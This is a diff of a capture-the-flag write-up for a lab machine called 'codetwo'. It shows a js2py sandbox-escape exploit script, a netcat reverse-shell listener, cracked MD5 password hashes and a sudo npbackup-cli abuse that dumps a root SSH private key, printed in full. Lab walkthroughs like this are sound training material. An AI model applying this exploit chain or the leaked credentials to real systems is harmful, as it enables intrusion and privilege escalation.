@@ -2,7 +2,7 @@
 ----------------------------------------------------------------
 2.I got that service that vulnerbale to the "https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape/blob/main/README.md"
 And I git the reverse shell with that.
-=====
+```bash
 import requests  
 import json  
   
@@ -25,10 +25,10 @@ headers = {"Content-Type": "application/json"}
   
 r = requests.post(url, data=json.dumps(payload), headers=headers)  
 print(r.text)
-=====
+```
 --------------------------------------------------------------------------------------------------------------------------------------------
 3. I got the reverseshell 
-                                                                                                                                                             
+ ```bash                                                                                                                                                            
 ┌──(sabeshan㉿kali)-[~]
 └─$ nc -lvnp 1337                      
 listening on [any] 1337 ...
@@ -50,7 +50,9 @@ zsh: suspended  nc -lvnp 1337
 app@codetwo:~/app$ export TERM=xterm
 app@codetwo:~/app$ 
 -----------------------------------------------------------------------------------------------------------------------------------------------
+```
 4. I get the initial enumeration and got the users.db file and I find the hashes file in there.
+```bash
 app@codetwo:~/app$ ls -la
 total 32
 drwxrwxr-x 6 app app 4096 Feb 23 05:18 .
@@ -105,7 +107,9 @@ sweetangelbabylove (?)
 Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
 Session completed.
 ----------------------------------------------------------------------------------------
+```
 5. I got the configuration and escalte the path using path get the root access with it
+```bash
 marco@codetwo:~$ sudo -l
 Matching Defaults entries for marco on codetwo:
     env_reset, mail_badpass,
@@ -219,9 +223,11 @@ global_options:
   auto_upgrade_server_password:
   auto_upgrade_host_identity: ${MACHINE_ID}
   auto_upgrade_group: ${MACHINE_GROUP}
+```
 I change the path to the root and i can read the root file includiing ssh configs
 ----------------------------------------------------------------------------------------------------------------------------
 6. I got the root privildges with retriving this private key
+```bash
 marco@codetwo:~$ sudo npbackup-cli -c npbackup.conf -f --dump /root/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -261,4 +267,5 @@ o85/zCvGKm/BYjoldz23CSOFrssSlEZUppA6JJkEovEaR3LW7b1pBIMu52f+64cUNgSWtH
 kXQKJhgScWFD3dnPx6cJRLChJayc0FHz02KYGRP3KQIedpOJDAFF096MXhBT7W9ZO8Pen/
 MBhgprGCU3dhhJMQAAAAxyb290QGNvZGV0d28BAgMEBQ==
 -----END OPENSSH PRIVATE KEY-----
+```
 =====================================================================================================================
